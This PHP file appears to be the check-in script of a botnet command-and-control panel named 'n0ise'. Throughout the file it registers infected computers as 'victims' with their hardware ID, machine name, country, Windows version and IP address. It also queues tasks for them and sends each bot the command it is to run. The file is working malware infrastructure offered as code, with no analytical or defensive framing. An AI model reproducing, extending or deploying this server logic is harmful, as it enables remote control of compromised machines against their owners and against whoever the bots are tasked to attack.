<?php 
include("_bot/run.php"); // Ensure this sets up $_n0ise (the database wrapper)

// ===== Logging Function =====
function log_event($message) {
    $log_file = __DIR__ . '/debug.log';
    file_put_contents($log_file, "[" . date("Y-m-d H:i:s") . "] $message\n", FILE_APPEND);
}

// ===== Handle Agent Check-In =====
if (isset($_POST['hwid'])) {
    $hwid = $_n0ise->escape($_POST['hwid']);
    $ip   = $_SERVER['REMOTE_ADDR'];
    $time = time();
    $online = $_n0ise->online;  // Access the online duration setting

    log_event("Incoming check-in: HWID=$hwid from IP=$ip");

    // Task and victim lookup
    $query = $_n0ise->query("
        SELECT 
        (
            SELECT t.taskID
            FROM n0ise_tasks AS t
            WHERE t.time <= ?
            AND (
                (t.elapsed > ? AND
                 (SELECT COUNT(*) FROM n0ise_victims WHERE taskID = t.taskID AND ConTime > (? - ?)) <= t.bots)
                OR
                (t.elapsed = 0 AND
                 (SELECT COUNT(*) FROM n0ise_task_done WHERE taskID = t.taskID) < t.bots AND
                 (SELECT COUNT(*) FROM n0ise_task_done WHERE taskID = t.taskID AND vicID = v.ID) = 0)
            )
            ORDER BY t.elapsed
            LIMIT 1
        ) AS taskID, ID
        FROM n0ise_victims AS v
        WHERE v.HWID = ?
    ", [$time, $time, $time, $online, $hwid]);

    if (!$query) {
        log_event("SQL Error during victim/task lookup.");
        die("ERR:SQL");
    }

    // ===== Victim Not Found — Register =====
    if ($query->num_rows === 0) {
        log_event("Victim not found: HWID=$hwid. Registering...");

        if (isset($_POST['pcname'], $_POST['country'], $_POST['winver'], $_POST['botver'])) {
            $pcname  = $_n0ise->escape($_POST['pcname']);
            $botver  = $_n0ise->escape($_POST['botver']);
            $country = $_n0ise->escape($_POST['country']);
            $winver  = $_n0ise->escape($_POST['winver']);

            $result = $_n0ise->query("
                INSERT INTO n0ise_victims 
                (`ID`, `PCName`, `BotVersion`, `InstTime`, `ConTime`, `Country`, `WinVersion`, `HWID`, `IP`, `taskID`) 
                VALUES 
                (NULL, ?, ?, ?, ?, ?, ?, ?, ?, 0)
            ", [$pcname, $botver, $time, $time, $country, $winver, $hwid, $ip]);

            if ($result) {
                log_event("Victim registered: $hwid / $ip / $pcname");
            } else {
                log_event("Failed to register victim: $hwid");
            }
        } else {
            log_event("Incomplete POST data. Missing fields during registration.");
        }

        die(); // Stop after registration
    }

    // ===== Victim Exists — Assign Task =====
    $victim = $query->fetch_array(MYSQLI_ASSOC);

    // Look up assigned task
    $taskResult = $_n0ise->query("SELECT elapsed, command FROM n0ise_tasks WHERE taskID = '{$victim['taskID']}'");

    if (!$taskResult || $taskResult->num_rows === 0) {
        log_event("Victim ID {$victim['ID']} has no valid task or task not found.");
        die(); // No task available
    }

    $task = $taskResult->fetch_array(MYSQLI_ASSOC);
    $taskID = $task['elapsed'] ? (int)$victim['taskID'] : 0;
    $botver = $_n0ise->escape($_POST['botver']);

    // Update victim connection time and assigned task
    $_n0ise->query("
        UPDATE n0ise_victims 
        SET ConTime = ?, IP = ?, taskID = ?, BotVersion = ? 
        WHERE ID = ?
    ", [$time, $ip, $taskID, $botver, $victim['ID']]);

    log_event("Victim ID {$victim['ID']} updated. TaskID: $taskID");

    // If task is instant, mark as done
    if (!$task['elapsed']) {
        $_n0ise->query("INSERT INTO n0ise_task_done (taskID, vicID) VALUES (?, ?)", [$victim['taskID'], $victim['ID']]);
        log_event("Instant task {$victim['taskID']} marked done for victim {$victim['ID']}");
    }

    // Return task command
    log_event("Sending command to victim ID {$victim['ID']}: " . $task['command']);
    die($task['command']);
}
?>
